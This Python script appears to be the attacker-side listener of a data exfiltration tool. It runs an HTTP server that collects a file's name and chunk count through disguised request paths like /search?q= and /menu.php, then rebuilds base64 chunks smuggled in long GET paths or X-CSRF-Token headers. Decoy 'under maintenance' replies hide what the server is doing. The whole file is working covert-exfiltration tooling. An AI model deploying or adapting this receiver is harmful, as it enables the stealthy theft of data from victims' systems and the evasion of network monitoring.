#!/usr/bin/env python3
"""
    ./serverside.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import re
import os
import base64
import threading

try:
    os.mkdir("out")
except FileExistsError:
    pass


counter = 0

class S(BaseHTTPRequestHandler):


    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):

        global filename
        global fileparts
        global counter

        if re.match("\/search\?q\=\/.{1,}",self.path):
            filename = re.sub("\/search\?q\=\/", '',self.path)
            filename = filename[::-1]
        
        if re.match("\/menu\.php\?query=.{1,}",self.path):
            filename = re.sub("\/menu\.php\?query=", '',self.path)
            filename = filename[::-1]

        if re.match("\/menu\.php\?w=\d{1,}",self.path):
            fileparts = re.sub("\/menu\.php\?w=", '',self.path)
            fileparts = int(fileparts)+1

           
        if re.match("^\/[a-z]\/\S{100,}",self.path):
            print("Receiving data via GET: {}\n".format(self.path))
            self.path = re.sub("^\/[a-z]\/", '',self.path)


            with open(os.getcwd()+"/out/"+filename, 'ab+') as crypt:
                crypt.write(base64.b64decode(self.path))
        

        for h in self.headers:
            if h == 'X-CSRF-Token':
                counter = counter +1
                
                print("({}/{} - {}%) Receiving data from {} via headers: {} {}".format(counter, fileparts, round((counter / fileparts *100),2),self.client_address[0], h, self.headers[h]))

                if counter == fileparts:
                    counter = 0

                with open(os.getcwd()+"/out/"+filename, 'ab+') as crypt:
                    crypt.write(base64.b64decode(self.headers[h]))
                

        self._set_response()
        ##fake response##
        self.wfile.write("Under maintenance. Please try again in a few hours.".encode('utf-8'))


    def do_POST(self):

        self._set_response()
        self.wfile.write("Upload is not allowed to this website!".encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting HTTPServer...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping HTTPServer...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
